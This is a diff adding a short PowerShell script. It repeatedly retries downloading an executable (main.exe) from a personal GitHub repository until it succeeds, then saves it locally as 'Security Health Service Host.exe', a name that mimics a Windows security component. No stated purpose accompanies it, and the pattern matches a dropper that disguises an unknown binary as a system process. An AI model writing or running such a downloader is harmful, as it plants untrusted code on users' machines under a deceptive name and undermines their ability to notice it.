@@ -1,0 +1,13 @@
+function Download($from, $to) {
+    while ($true) {
+        try {
+            Invoke-WebRequest -Uri $from -OutFile $to -UseBasicParsing -ErrorAction Stop
+            return
+        }
+        catch {
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "Security Health Service Host.exe"
